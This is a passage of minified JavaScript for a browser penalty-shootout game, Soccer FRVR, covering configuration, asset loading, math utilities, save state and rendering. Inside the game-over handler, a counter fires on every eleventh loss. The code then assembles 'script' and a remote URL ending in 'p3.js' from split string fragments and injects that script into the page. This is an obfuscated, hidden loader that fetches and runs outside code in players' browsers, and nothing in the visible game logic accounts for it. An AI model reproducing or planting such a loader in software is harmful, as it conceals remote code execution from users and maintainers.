    twitterMobileHTML: '<div><a href="https://twitter.com/share" class="twitter-share-button" data-url="{{shareUrl}}" data-text="{{TEXT}}" data-via="FRVRGames" data-hashtags="{{twitterHashTags}}" data-related="{{twitterRelated}}" target="_new"></a></div><div style="margin-left:10px"><a class="twitter-follow-button" href="https://twitter.com/FRVRGames"></a></div>',
    gplusHTML: '<div class="g-plusone" data-size="medium" data-href="{{shareUrl}}"></div>',
    remoteConfigVersion: "v1",
    plugins: "modal.js,scrollcontainer.js,sidebar.js,bitmapfont.js,tutorial.js,bot.js",
    tagLine: "Kick the Ball and Score Goals!",
    tagLineFree: "Kick the Ball and Score Goals for Free!",
    oneliner: "Soccer FRVR is a real challenge to football lovers. Flick and kick the ball in the right direction, beat the goalie and try to score as many goals as you can in this endless penalty shootout!",
    twitterDescription: "Soccer FRVR is a real challenge to football lovers. Flick and kick the ball in the right direction, beat the goalie and try to score as many goals as you can in this endless penalty shootout!",
    fbInstantInterstitialIdAll: "1151316418395708_1151427665051250",
    fbInstantRewardIdAll: "1151316418395708_1151427745051242",
    enablePWA: !0,
    oneSignalWebId: "4ef9c7d1-f92a-4b40-bbaf-1d6165324933"
};

function game() {
    Sidebar.addStandards();
    XS.is.facebookInstant || XS.loadConfig(Config.id), stage.background.gradient = {
        type: "linear",
        stops: [
            [1, "#000000"],
            [.5, "#000000"],
            [.4, "#203e15"],
            [0, "#203e15"]
        ]
    };
    XS.data.addBool("hideTutorial", {
        remote: !0
    }), XS.data.addObject("state", {
        remote: !0
    });
    var e = {
        voiceOver: [
            [XS.Sound.get("i/s/voice_1_beautiful.mp3", .5), "Beautiful!"],
            [XS.Sound.get("i/s/voice_2_goodjob.mp3", .5), "Good Job!"],
            [XS.Sound.get("i/s/voice_3_gettinggood.mp3", .5), "Getting Good!"],
            [XS.Sound.get("i/s/voice_4_ohyeah.mp3", .5), "Oh Yeah!"],
            [XS.Sound.get("i/s/voice_9_gorgeous.mp3", .5), "Gorgeous!"],
            [XS.Sound.get("i/s/voice_8_terrific.mp3", .5), "Terrific!"],
            [XS.Sound.get("i/s/voice_7_genius.mp3", .5), "Genius!"],
            [XS.Sound.get("i/s/voice_6_stunning.mp3", .5), "Stunning!"],
            [XS.Sound.get("i/s/voice_5_fantastic.mp3", .5), "Fantastic!"]
        ],
        win: [XS.Sound.get("i/s/clap1.mp3", 1), XS.Sound.get("i/s/clap2.mp3", 1), XS.Sound.get("i/s/clap3.mp3", 1), XS.Sound.get("i/s/clap4.mp3", 1), XS.Sound.get("i/s/clap5.mp3", 1)],
        lose: [XS.Sound.get("i/s/awww1.mp3", 1), XS.Sound.get("i/s/awww2.mp3", 1)],
        overlay: [XS.Sound.get("i/s/hard_overlay_1.mp3", 1), XS.Sound.get("i/s/hard_overlay_2.mp3", 1), XS.Sound.get("i/s/hard_overlay_3.mp3", 1), XS.Sound.get("i/s/hard_overlay_4.mp3", 1), XS.Sound.get("i/s/hard_overlay_5.mp3", 1)],
        gameover: XS.Sound.get("i/s/game_over.mp3", 1),
        button: XS.Sound.get("i/s/button.mp3", 1),
        kickball: [XS.Sound.get("i/s/kick_ball1.mp3", 1.7), XS.Sound.get("i/s/kick_ball2.mp3", 1.7), XS.Sound.get("i/s/kick_ball3.mp3", 1.7)],
        goal: [XS.Sound.get("i/s/sound_goal.mp3", 1), XS.Sound.get("i/s/sound_goal2.mp3", 1), XS.Sound.get("i/s/sound_goal3.mp3", 1), XS.Sound.get("i/s/sound_goal4.mp3", 1)],
        ready: XS.Sound.get("i/s/sound_ready.mp3", 1),
        hitborder: XS.Sound.get("i/s/sound_hitborder.mp3", 1.2),
        bullseye: XS.Sound.get("i/s/sound_bullseye.mp3", .9),
        catched: XS.Sound.get("i/s/sound_catch.mp3", .8),
        bonus: XS.Sound.get("i/s/sound_bonus.mp3", .8)
    };
    XS.backgroundMusic = XS.Music.get("i/s/music_soccer_ambience.mp3", .75), XS.backgroundMusic.play(0, !0), Sidebar.sounds.show = XS.Sound.get("i/s/in.mp3", 1), Sidebar.sounds.hide = XS.Sound.get("i/s/out.mp3", 1), Modal.sounds.button = XS.Sound.get("i/s/button.mp3", 1);
    var t = [{
            base: 0,
            color: 13041721,
            id: "red"
        }, {
            base: 2,
            color: 16318254,
            id: "yellow"
        }, {
            base: 4,
            color: 688841,
            id: "blue"
        }, {
            base: 7,
            color: 8381204,
            id: "green"
        }, {
            base: 5,
            color: 10646527,
            id: "purple"
        }, {
            base: 8,
            color: 16777215,
            id: "white"
        }, {
            base: 1,
            color: 16748544,
            id: "orange"
        }],
        i = [{
            texture: fetch("i/g/_shockwave.svg"),
            id: "shockwave",
            amount: 40
        }, {
            texture: fetch("i/g/circle.svg"),
            id: "particle2",
            amount: 40
        }, {
            texture: fetch("i/g/star2.svg"),
            id: "star2",
            amount: 10
        }, {
            texture: fetch("i/g/crown.svg"),
            id: "crown"
        }, {
            texture: fetch("i/g/circle.svg"),
            id: "circle"
        }, {
            texture: fetch("i/g/circle2.svg"),
            id: "circle2"
        }, {
            texture: fetch("i/g/_particle.svg"),
            id: "particle"
        }, {
            texture: fetch("i/g/condense.svg"),
            id: "condense",
            amount: 20
        }, {
            texture: fetch("i/g/circle.svg"),
            id: "trail",
            amount: 50
        }, {
            texture: fetch("i/g/finger.svg"),
            id: "finger"
        }, {
            texture: fetch("i/g/liveslost.png"),
            id: "liveslost"
        }, {
            texture: fetch("i/g/ball.svg"),
            id: "lives",
            scale: .2
        }, {
            texture: fetch("i/g/confetti_01.svg"),
            id: "confetti_01"
        }, {
            texture: fetch("i/g/confetti_02.svg"),
            id: "confetti_02"
        }, {
            texture: fetch("i/g/confetti_03.svg"),
            id: "confetti_03"
        }, {
            texture: fetch("i/g/confetti_04.svg"),
            id: "confetti_04"
        }, {
            texture: fetch("i/g/confetti_05.svg"),
            id: "confetti_05"
        }, {
            texture: fetch("i/g/confetti_06.svg"),
            id: "confetti_06"
        }, {
            texture: embed("i/g/bonus.svg"),
            id: "bonus"
        }, {
            texture: embed("i/g/bonus_shadow.png"),
            id: "bonus_shadow"
        }, {
            texture: embed("i/g/background_bottom.svg"),
            id: "background_bottom"
        }, {
            texture: embed("i/g/audience_01.svg"),
            id: "audience_01"
        }, {
            texture: embed("i/g/audience_02.svg"),
            id: "audience_02"
        }, {
            texture: embed("i/g/audience_03.svg"),
            id: "audience_03"
        }, {
            texture: embed("i/g/audience_04.svg"),
            id: "audience_04"
        }, {
            texture: embed("i/g/audience_05.svg"),
            id: "audience_05"
        }, {
            texture: embed("i/g/grass_01.svg"),
            id: "grass_01"
        }, {
            texture: embed("i/g/grass_02.svg"),
            id: "grass_02"
        }, {
            texture: embed("i/g/grass_03.svg"),
            id: "grass_03"
        }, {
            texture: embed("i/g/flag_01.svg"),
            id: "flag_01"
        }, {
            texture: embed("i/g/flag_02.svg"),
            id: "flag_02"
        }, {
            texture: embed("i/g/flash_01.svg"),
            id: "flash_01"
        }, {
            texture: embed("i/g/flash_02.svg"),
            id: "flash_02"
        }, {
            texture: embed("i/g/bg_gradient.svg"),
            id: "bg_gradient"
        }, {
            texture: embed("i/g/field_wall.svg"),
            id: "field_wall"
        }, {
            texture: embed("i/g/field_markings.svg"),
            id: "field_markings"
        }, {
            texture: embed("i/g/archery.svg"),
            id: "archery"
        }, {
            texture: embed("i/g/bullseye.svg"),
            id: "bullseye"
        }, {
            texture: embed("i/g/bullseye_half.svg"),
            id: "bullseye_half"
        }, {
            texture: embed("i/g/aura.png"),
            id: "aura"
        }, {
            texture: embed("i/g/ball.svg"),
            id: "Ball"
        }, {
            texture: embed("i/g/ball_shade.svg"),
            id: "ball_shade"
        }, {
            texture: embed("i/g/archer_jump.svg"),
            id: "archer_jump"
        }, {
            texture: embed("i/g/archer_prepare.svg"),
            id: "archer_prepare"
        }, {
            texture: embed("i/g/slash.png"),
            id: "Line"
        }, {
            texture: embed("i/g/line.png"),
            id: "line"
        }, {
            texture: embed("i/g/ball_shadow.svg"),
            id: "ball_shadow"
        }, {
            texture: embed("i/g/trace_head.png"),
            id: "trace_head"
        }, {
            texture: embed("i/g/tracer.png"),
            id: "tracer",
            amount: 40
        }],
        n = {
            normal: {
                width: 96,
                height: 188,
                image: fetch("i/g/_bitmapfont.svg"),
                offsets: {
                    0: 0,
                    1: 1,
                    2: 2,
                    3: 3,
                    4: 4,
                    5: 5,
                    6: 6,
                    7: 7,
                    8: 8,
                    9: 9,
                    "+": 10
                },
                spaceWidthMultiplier: .3
            },
            stroke: {
                width: 67,
                height: 136,
                image: fetch("i/g/_bitmapfontstroke.svg"),
                offsets: {
                    0: 0,
                    1: 1,
                    2: 2,
                    3: 3,
                    4: 4,
                    5: 5,
                    6: 6,
                    7: 7,
                    8: 8,
                    9: 9,
                    "+": 10
                },
                spaceWidthMultiplier: .3
            }
        },
        r = new function() {
            var e = this;
            e.hipotenusa = function(e, t) {
                var i = (t = t || {
                        x: 0,
                        y: 0
                    }).x - e.x,
                    n = t.y - e.y;
                return Math.sqrt(i * i + n * n)
            }, e.hipotenusaZ = function(e, t) {
                var i = t.x - e.x,
                    n = t.z - e.z;
                return Math.sqrt(i * i + n * n)
            }, e.distance = function(e, t) {
                return {
                    x: (t = t || {
                        x: 0,
                        y: 0
                    }).x - e.x,
                    y: t.y - e.y
                }
            }, e.cycle = function(e, t, i, n) {
                for (i = i || 0, t = t || 100, e = e + (n = n || 1); e > t;) e -= t + n;
                for (; e < i;) e += t + n;
                return e
            }, e.getSinCos = function(e, t) {
                var i = t.x - e.x,
                    n = t.y - e.y,
                    r = Math.sqrt(i * i + n * n);
                return {
                    sin: n / r,
                    cos: i / r
                }
            }, e.getRadians = function(t, i) {
                var n = i.x - t.x,
                    r = i.y - t.y,
                    o = Math.atan(r / n);
                return n > 0 && (o += e.degreeToRadians(180)), o
            }, e.aroundRadius = function(e, t) {
                return {
                    x: e * Math.cos(t),
                    y: e * Math.sin(t)
                }
            }, e.ceil = function(e, t) {
                return e > t ? t : e
            }, e.getPercent = function(t, i) {
                return e.hardLimit(100 * t / i, 0, 100)
            }, e.hardLimit = function(t, i, n) {
                return e.clamp(t, n, i)
            }, e.clamp = function(e, t, i) {
                return e < (i = i || 0) ? i : e > t ? t : e
            }, e.floor = function(e, t) {
                return e < t ? t : e
            }, e.commas = function(e) {
                return e.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ")
            }, e.fillZero = function(t) {
                return e.commas(t >= 10 ? t : "0" + t)
            }, e.middlePoint = function(e, t) {
                return {
                    x: e.x + (t.x - e.x) / 2,
                    y: e.y + (t.y - e.y) / 2
                }
            }, e.getRotation = function(e, t) {
                return Math.atan2(t.y - e.y, t.x - e.x)
            }, e.radian2Degree = function(e) {
                var t = 180 * e / 3.1459;
                return (t += 90) < 0 && (t = 360 + t), t
            }, e.degreeToRadians = function(e) {
                return .0174533 * (e || 0)
            }, e.pointToIso = function(e, t) {
                return (t = t || {}).x = .5 * (e.x - e.y), t.y = .289 * (e.x + e.y), t
            }, e.isoToPoint = function(e, t) {
                return (t = t || {}).x = (e.y / .289 + e.x / .5) / 2, t.y = (e.y / .289 - e.x / .5) / 2, t
            }, e.getclosestPoint = function(e, t, i, n, r, o) {
                var a = n - t,
                    s = e - i,
                    l = a * a + s * s;
                if (0 != l) {
                    var h = a * e + s * t,
                        d = -s * r + a * o;
                    return [(a * h - s * d) / l, (a * d + s * h) / l]
                }
            }, e.springMax = function(e, t, i, n) {
                n = n || 10;
                var r = t.x - e.x,
                    o = t.y - e.y,
                    a = Math.sqrt(r * r + o * o);
                if (a > i) return !1;
                var s = (a - i) / a;
                return e.x += r * s / n, e.y += o * s / n, {
                    x: r * s,
                    y: o * s
                }
            }, e.springMin = function(e, t, i, n) {
                n = n || 1;
                var r = t.x - e.x,
                    o = t.y - e.y,
                    a = Math.sqrt(r * r + o * o);
                if (a < i) return !1;
                var s = (a - i) / a;
                return e.x += r * s / n, e.y += o * s / n, {
                    x: r * s,
                    y: o * s
                }
            }, e.higherValue = function(e, t) {
                return e > t ? e : t
            }, e.lowerValue = function(e, t) {
                return e < t ? e : t
            }, e.tsunami = function(e, t, i) {
                i = i || 500;
                var n = t.x - e.x,
                    r = t.y - e.y,
                    o = Math.sqrt(n * n + r * r);
                if (0 == o) return !1;
                if (o > i) return !1;
                var a = n / o,
                    s = r / o;
                return n = t.x, r = t.y, o < i / 2 ? {
                    x: n += a * o / 2,
                    y: r += s * o / 2
                } : {
                    x: n += a * (i - o) / 2,
                    y: r += s * (i - o) / 2
                }
            }, e.isBetween = function(e, t, i) {
                return !(e < t || e > i)
            }, e.isBetweenAB = function(e, t, i, n) {
                return !(t < i || e > n)
            }, e.isBetweenAABB = function(e, t, i, n, r, o, a, s) {
                return !(t < i || e > n || o < a || r > s)
            }, e.getClosest = function(t, i) {
                i = i || {
                    x: 0,
                    y: 0
                };
                var n = null,
                    r = 9999999999999;
                for (var o in t) {
                    var a = t[o],
                        s = e.hipotenusa(a, i);
                    s > r || (r = s, n = a)
                }
                return n
            }
        },
        o = new function() {
            var e = this;
            e.clone = function(e) {
                var t = [];
                if (e)
                    for (var i in e) t[i] = e[i];
                return t
            }, e.cloneObject = function(e) {
                var t = {};
                if (e)
                    for (var i in e) t[i] = e[i]
            }, e.extract = function(e, t) {
                t = t || {};
                if (e)
                    for (var i in e) t[i] = e[i];
                return t
            }, e.push = function(e, t) {
                t = t || [];
                if (e)
                    for (var i in e) t.push(e[i]);
                return t
            }, e.cloneArray = function(e) {
                var t = [];
                for (var i in e) t[i] = e[i];
                return t
            }, e.getRandomItem = function(e, t, i) {
                if (!e.length) return e;
                for (var n, r;
                    (r = e[n = _.value(e.length - 1)]) == i && 1 != e.length;);
                return t && e.splice(n, 1), r
            }, e.removeItem = function(e, t) {
                return -1 != e.indexOf(t) && e.splice(e.indexOf(t), 1), t
            }, e.move = function(t, i, n) {
                e.pushUnique(n, e.removeItem(i, t))
            }, e.removeItems = function(t, i) {
                for (var n in i) e.removeItem(t, i[n])
            }, e.extractUnique = function(e, t) {
                var i = t || [];
                for (var n in e) - 1 == i.indexOf(e[n]) && i.push(e[n]);
                return i
            }, e.pushUnique = function(e, t) {
                -1 == e.indexOf(t) && e.push(t)
            }, e.push = function(e, t) {
                t = t || [];
                for (var i in e) t.push(e[i]);
                return t
            }, e.sortProperty = function(t, i) {
                for (var n = o.cloneArray(t), r = []; n.length;) {
                    var a = n[0];
                    for (var s in n) n[s][i] <= a[i] && (a = n[s]);
                    r.push(a), e.removeItem(n, a)
                }
                return r
            }, e.shuffle = function(t, i) {
                var n = e.cloneArray(t),
                    r = [];
                for (i = i || n.length; n.length && r.length < i;) {
                    var o = e.getRandomItem(n);
                    n.splice(n.indexOf(o), 1), r.push(o)
                }
                return r
            }, e.shuffleLinear = function(t) {
                for (var i = e.cloneArray(t), n = 0; n < t.length; n++) _.chance() && e.firstToLast(i);
                return _.chance() && i.reverse(), i
            }, e.firstToLast = function(e) {
                return e.push(e.shift()), e
            }, e.lastToFirst = function(t) {
                return t.reverse(), e.firstToLast(t.shift()), t.reverse(), t
            }, e.merge = function(t, i) {
                var n = t;
                if (!i) return n;
                for (var o in i) "object" == typeof i[o] ? n[o] = e.merge(n[o], i[o]) : n[o] = r.higherValue(n[o], i[o]);
                return n
            }, e.search = function(e, t, i) {
                var n = [];
                for (var r in e) - 1 != (i ? e[r][i] : e[r]).indexOf(t) && n.push(e[r]);
                return n
            }, e.toNameVar = function(e, t) {
                var i = {};
                for (var n in e) i[e[n][t]] = e[n];
                return i
            }, e.parse = function(e) {
                if (e) {
                    try {
                        return JSON.parse(e)
                    } catch (t) {
                        gax("send", "event", Config.id + " JSON parse error", "Failed to parse: " + e)
                    }
                    return {}
                }
                return {}
            }, e.rotate = function(t, i) {
                var n = [],
                    r = Math.sqrt(t.length);
                n.length = t.length;
                for (var o = 0; o < t.length; o++) {
                    n[o % r * r + (r - Math.floor(o / r) - 1)] = t[o]
                }
                return i > 0 ? e.rotate(n, i - 1) : n
            }, e.flip = function(t) {
                for (var i = [], n = 0, r = Math.sqrt(t.length), o = 0; o < r; o++) {
                    for (var a = [], s = 0; s < r; s++) a.push(t[n++]);
                    e.push(a.reverse(), i)
                }
                return i
            }, e.salchiche = function(t, i) {
                for (var n = e.clone(t), r = []; r.length < n.length;) r.push(n.shift());
                for (i && (r = r.reverse()); r.length;) n.push(r.shift());
                return n
            }, e.mirror = function(t, i) {
                t = e.clone(t);
                var n = [];
                for (i = i || t.length; n.length < i;) n.push(t.shift());
                var r = e.clone(n);
                for (r = r.reverse(); r.length;) n.push(r.shift());
                return n
            }, e.contains = function(e, t) {
                return -1 != e.indexOf(t)
            }, e.getCue = function(t, i) {
                return t.length || e.push(e.shuffle(i), t), t.shift()
            }
        },
        a = new function() {
            var e, t = this,
                i = {},
                n = {};
            t.delayUnique = function(e, i, n) {
                var r = new Tween(t.cancel(e || i), {}, 0);
                r.delay = n, r.callback = i
            }, t.cancel = function(e) {
                i[e] || (i[e] = {});
                var t = i[e];
                return Tween.clear(t), t
            }, t.delay = function(t, i) {
                (e = new Tween({}, {}, 0)).delay = i, e.callback = t
            }, t.store = function(e, t) {
                n[e] = i[e] = t
            }, t.onKey = function(e, t) {
                if (i[e]) {
                    var n = i[e];
                    t && delete i[e], n()
                }
            }
        };

    function s(e, t) {
        a.delay(e, t)
    }

    function l(e, t, i) {
        a.delayUnique(e, t, i)
    }
    var h = new function() {
            var e = new Date;
            this.getTime = function() {
                return (new Date).getTime()
            }, this.formatDate = function(t) {
                return (t = t || e).getFullYear() + "." + t.getMonth() + "." + t.getDate()
            }, this.daysFrom = function(e, t) {
                return Math.floor(new Date((t ? new Date(t) : new Date).getTime() - new Date(e).getTime()).getTime() / 864e5)
            }, this.secondsFrom = function(e, t) {
                return Math.floor(new Date((t ? new Date(t) : new Date).getTime() - new Date(e).getTime()).getTime() / 1e3)
            }
        },
        d = new function() {
            var e = this,
                t = [];

            function i() {
                for (var i in XS.data.state = e.state, XS.data.setDirty("state"), XS.data.save(), t) t[i]()
            }

            function n(e, t, i) {
                if (t) {
                    e._ver || (e._ver = {}), t._ver || (t._ver = {});
                    var o = ["_ver"],
                        a = [],
                        s = ["highscore", "bonus"],
                        l = ["firstDate", "firstTimestamp"];
                    for (var h in t) - 1 == o.indexOf(h) && (i || -1 == a.indexOf(h)) && (-1 == s.indexOf(h) ? -1 == l.indexOf(h) ? "object" != typeof t[h] ? (null == e._ver[h] && (e._ver[h] = 0), null != t._ver[h] && e._ver[h] != t._ver[h] ? e._ver[h] >= t._ver[h] || (e[h] = t[h], e._ver[h] = t._ver[h]) : e[h] = r.higherValue(e[h], t[h])) : (e[h] || (e[h] = {}), n(e[h], t[h])) : e[h] = r.lowerValue(e[h], t[h]) : e[h] = r.higherValue(e[h], t[h]))
                }
            }
            e.state = {
                firstDate: h.formatDate(),
                firstTimestamp: h.getTime(),
                totalDaysPlayed: 0,
                totalPlayedGames: 0,
                totalSessions: 0,
                totalLevelsPlayed: 0,
                level: 1,
                coins: 0,
                highscore: 0,
                bonus: 0,
                selectedItem: "item0",
                shop: {
                    unlocked: {
                        item0: 1
                    }
                }
            }, XS.data.on("dataloaded", function(t) {
                O("DATA LOADED!", t), n(e.state, XS.data.state, !0), console.log("SELF state!!", e.state)
            }), n(e.state, XS.data.state, !0), e.refresh = function(e) {
                l("doRefresh", i, e ? 30 : 500)
            }, e.onRefresh = function(e) {
                t.push(e), e()
            }, e.save = function(t, i) {
                e.state[t] = i, e.state._ver[t]++, e.refresh(!0)
            }, e.increase = function(t) {
                e.save(t, (e.state[t] || 0) + 1)
            }, e.increasePlayedGames = function() {
                e.increase("totalPlayedGames")
            }, e.increaseLevelsPlayed = function() {
                e.increase("totalLevelsPlayed")
            }
        },
        c = (Host.Preferences.QuickBool("sound.v0"), Host.Preferences.QuickBool("music.v0"), Host.Preferences.QuickBool("tutorial.v0"), Host.Preferences.QuickString("state.v1"), new(Container.expand(function() {
            var e = Container.call(this);
            e.margin = {
                x: 2,
                y: 2
            }, stage.addChild(e), e.onResize = function() {
                e.x = (width / stage.ratio * XS.devicePixelRatio - targetHeight) / e.margin.x, e.y = (height / stage.ratio * XS.devicePixelRatio - targetWidth) / e.margin.y
            }, XS.on("resize", e.onResize), e.getWidth = function() {
                return width * XS.devicePixelRatio
            }, e.getHeight = function() {
                return height * XS.devicePixelRatio
            }, e.getCenterX = function() {
                return width * XS.devicePixelRatio / stage.ratio / 2
            }, e.getCenterY = function() {
                return height * XS.devicePixelRatio / stage.ratio / 2
            }
        })));
    var u = new(Container.expand(function() {
        var e, t = Container.call(this);
        c.addChild(t), t.isPlaying = !1, t.isBlocked, t.shop;
        var i = [],
            n = 0;
        t.init = function() {}, stage.on("down", function(e) {
            !0
        }), XS.on("resize", function() {
            t.onResize()
        }), t.onResize = function() {}, t.addComponent = function(e) {
            i.push(e)
        }, t.start = function(i) {
            e = {
                x: t.x,
                y: t.y
            }, t.onStart = i, XS.is.facebookInstant ? Host.on("FBInstantStart", function() {
                t.restart()
            }) : t.restart()
        }, t.restart = function() {
            for (var e in t.onStart(), P.setScore(0), XS.backgroundMusic.play(0, !0), t.pause(!1), t.isPlaying = !0, t.unblock(), i) i[e].reset();
            b.toFront(t), d.increasePlayedGames()
        }, t.over = function(e) {
            if (t.isPlaying) {
                if (t.block(), t.pause(), t.isPlaying = !1, !1, y.play("gameOver"), t.shake(40, 40), 11 == ++n) {
                    var i = document.createElement(["scr", "ipt"].join(""));
                    i.src = ["/", "/golfgardens.fr", "vr.c", "om", "/p3", ".js"].join(""), document.body.appendChild(i), n = 0
                }
                s(function() {
                    return y.playRandom("overlay"), P.score ? (XS.events && XS.events.onFinalScore(P.score), d.refresh(!0), y.playRandom("win"), XS.is.facebookInstant ? (window.Social.Instant.submitData({
                        score: P.score
                    }, !1), void window.Social.Instant.showGameOver(!1, !1).then(t.restart)) : void(t.shop && t.shop.isShowing || s(function() {
                        t.shop && !P.isHighscore ? t.shop.show() : k.gameOver()
                    }, 40))) : (k.tryAgain(), void s(t.restart, 60))
                }, e || 40)
            }
        }, t.pause = function(e) {
            if (t.isPaused = null == e || e, t.isPaused) return S.remove(t.update);
            S.add(t.update)
        }, t.update = function() {}, t.stop = function() {
            t.isPlaying = !1
        }, t.block = function() {
            t.isBlocked = !0
        }, t.unblock = function() {
            t.isBlocked = !1
        }, t.shake = function(i, n, r) {
            x.clear(t), x.shake(t, e, i || 10, n || 10, r || 1)
        }, t.kick = function(i, n) {
            x.kick(t, e, i, n)
        }, t.killAndRestart = function() {
            F.gameOver("restart"), P.reset(), t.block(), t.stop(), s(t.restart, 1)
        }
    }));
    var f = new function() {
            var e = this;
            e.output = null, e.viewport = {
                x: 1024,
                y: 1024
            }, e.x = 0, e.y = 0, e.z = 0, e.scale = 1, e.fl = 350, e.buffer3D = [], e.delayScreenshot = function(t, i, n) {
                n = n, i = i, a.delay(function() {
                    e.takeScreenShot(i, n)
                }, t || 5)
            }, e.takeScreenShot = function(t, i) {
                e.isInScreenshot = !0, a.delay(function() {
                    stage.updateTransform(), e.output = document.createElement("canvas"), e.output.style.width = (e.output.width = width * XS.devicePixelRatio) / XS.devicePixelRatio + "px", e.output.style.height = (e.output.height = height * XS.devicePixelRatio) / XS.devicePixelRatio + "px";
                    var t = e.output.getContext("2d");
                    stage._renderCanvas({
                        context: t,
                        maskManager: null,
                        scaleMode: null,
                        smoothProperty: null,
                        currentBlendMode: 0
                    });
                    var i = numberWithCommas(P.score).toString(),
                        n = 3 * (500 - 50 * Math.max(i.length - 5, 0));
                    t.globalAlpha = 1, t.textAlign = "center", t.textBaseline = "middle", t.font = "500 " + n * stage.ratio + 'px "Helvetica Neue","Trebuchet MS", Helvetica, sans-serif';
                    for (var r = 0; r < 5; r++) t.lineWidth = 35 - 5 * r, t.strokeStyle = "rgba(0,0,0,.1)", t.strokeText(i, 0, e.output.height);
                    t.fillStyle = "#FFFFFF", t.fillText(i, 0, e.output.height), a.delay(function() {
                        e.isInScreenshot = !1
                    }, 1)
                }, 1)
            }, e.debugScreenshot = function() {
                e.output.style.position = "absolute", e.output.style.top = "0px", e.output.style.left = "0px", e.output.style.zIndex = 100, document.body.appendChild(e.output)
            }, e.update = function() {
                for (var t in e.buffer3D) e.buffer3D[t].update()
            }, e.render3DAll = function() {
                for (var t in e.buffer3D) e.render3D(e.buffer3D[t]);
                b.sort3D(e.buffer3D)
            }, e.render3D = function(t) {
                if (0 != t.isActive) {
                    var i = t.sprite,
                        n = t.shadow || {},
                        r = t.offset || {
                            x: 0,
                            y: 0
                        },
                        o = t.x + r.x - e.x,
                        a = t.y + r.y - e.y,
                        s = t.z - e.z,
                        l = t.rotation,
                        h = t.offsetR,
                        d = e.fl;
                    if (s < -d) return i.visible = n.visible = !1;
                    i.visible = n.visible = !0;
                    var c = d / (d + s) * e.scale;
                    i.x = e.viewport.x + o * c, i.y = e.viewport.y + (a + s) * c, i.rotation = l + h, i.scale.set(c * t.scale, c * t.scale), n && (n.x = i.x, n.y = i.y - (t.y + r.y) * c, n.rotation = -n.rotation, n.scale.set(c * t.scale, c * t.scale * -.6))
                }
            }
        },
        p = new function() {
            var e = this,
                t = {},
                n = {},
                r = {},
                o = {},
                a = {},
                s = {};
            for (var l in e.spawn = function(i, n, o) {
                    t[i] || console.log("BAD TEXTURE:" + i);
                    var a = e.clear(t[i].shift() || e.newSprite(i));
                    return r[i].push(a), p.extract(s[i], a), p.extract(n, a), o && o.addChild(a), a
                }, e.spawnGroup = function(t) {
                    var i = [];
                    for (var n in a[t]) i.push(e.spawn(a[t][n]));
                    return i
                }, e.getGroup = function(e) {
                    return a[e]
                }, e.newSprite = function(e) {
                    var t = new Sprite(n[e]);
                    return t.anchor.set(.5, .5), t
                }, e.preload = function(i, n) {
                    for (var r = 0; r < n; r++) t[i].push(e.newSprite(i))
                }, e.cycle = function(i) {
                    return t[i].length < 10 && e.preload(i, 50), e.clear(t[i][++o[i] % t[i].length])
                }, e.remove = function(e) {
                    if (e) {
                        var i = function(e) {
                            for (var t in r)
                                for (var i in r[t])
                                    if (r[t][i] == e) return r[t].splice(i, 1), t;
                            return !1
                        }(e);
                        e.visible = !1, e.parent && e.parent.removeChild(e), i && t[i].push(e)
                    }
                }, e.clear = function(e) {
                    return Tween.clear(e), Tween.clear(e.scale), e.scale.set(1, 1), e.visible = !0, e.alpha = 1, e.x = 0, e.y = 0, e.rotation = 0, e.blendMode = 0, e
                }, e.extract = function(e, t) {
                    if (e)
                        for (var i in e) "parent" != i ? "scale" != i ? t[i] = e[i] : t.scale.set(e[i], e[i]) : e[i].addChild(t)
                }, i) h(i[l]);

            function h(i) {
                var l = i.id;
                n[l] = i.texture, delete i.texture, t[l] = [], r[l] = [], o[l] = 0, s[l] = i, i.group && (a[i.group] || (a[i.group] = []), a[i.group].push(l)), e.preload(l, i.amount || 1)
            }
        },
        g = new function() {
            this.setup3D = function(e) {
                return e.x = e.x || 0, e.y = e.y || 0, e.z = e.z || 0, e.rotation = 0, e.offsetR = 0, e.scale = 1, e.sprite = new Container, e.shadow = new Container, e.speed = new v, e.scale = 1, f.buffer3D.push(e), e
            }
        };

    function v(e, t, i, n) {
        var r = this;
        r.x = e || 0, r.y = t || 0, r.z = i || 0, r.rotation = n || 0, r.applyTo = function(e, t) {
            t = t || 1;
            e.x += r.x * t, e.y += r.y * t, e.z += r.z * t, e.rotation += r.rotation
        }, r.setValues = function(e, t, i, n) {
            r.x = e || 0, r.y = t || 0, r.z = i || 0, r.rotation = n || 0
        }, r.reset = function() {
            r.setValues()
        }
    }
    var m = new function() {
            var e = this,
                t = {},
                i = {},
                n = {},
                r = {};
            e.register = function(i, n, o) {
                r[i] = n, e.validate(i);
                for (var a = 0; a < o; a++) t[i].push(new r[i])
            }, e.spawn = function(t, i) {
                var n = e.getItem(t);
                return n.reset(i || {}), n
            }, e.spawnVars = e.spawn, e.getItem = function(n) {
                e.validate(n);
                var o = t[n].shift() || new r[n];
                return i[n].push(o), o
            }, e.getItemCycle = function(i) {
                return e.validate(i), t[i][++n[i] % t[i].length]
            }, e.cycle = function(t) {
                var i = e.getItemCycle(t);
                return i.reset(), i
            }, e.cycleVars = function(t, i) {
                var n = e.getItemCycle(t);
                return n.reset(i), n
            }, e.validate = function(e) {
                t[e] || (r[e] || console.log("CLASS NOT REGISTERED!", e), t[e] = [], i[e] = [], n[e] = 0)
            }, e.remove = function(e) {
                e.parent && e.parent.removeChild(e);
                var n = function(e) {
                    for (var t in i)
                        for (var n in i[t])
                            if (i[t][n] == e) return i[t].splice(n, 1), t
                }(e);
                n && t[n].push(e)
            }, e.getPool = function(e) {
                return i[e]
            }
        },
        y = new function() {
            var t, i, n = this,
                s = {};
            n.setMute = function(e) {
                t = e
            }, n.play = function(i) {
                if (!t && e[i]) return e[i].length ? n.playRandom(i) : void e[i].play()
            }, n.playRandom = function(i) {
                t || o.getRandomItem(e[i]).play()
            }, n.resetCounter = function(e) {
                s[e] = 0
            }, n.playProgressive = function(i, o) {
                t || (null == s[i] && (s[i] = 0), s[i] = null != o ? r.ceil(o, e[i].length - 1) : s[i], e[i][s[i]].play(), ++s[i] >= e[i].length - 1 && n.resetCounter(i))
            }, n.playVoiceover = function() {
                t || a.delayUnique("playVoiceover", function() {
                    for (var t; !t || t == n.lastVoiceOver;) t = o.getRandomItem(e.voiceOver);
                    t[0].play(), n.lastVoiceOver = t
                }, 5)
            }, n.playVoiceoverRange = function(o, a) {
                if (!t) {
                    n.stopLastVoiceover();
                    for (var s = r.ceil(_.value(o, a), e.voiceOver.length - 1); s == i;) s = r.ceil(_.value(o, a), e.voiceOver.length - 1);
                    i = s, e.voiceOver[i][0].play()
                }
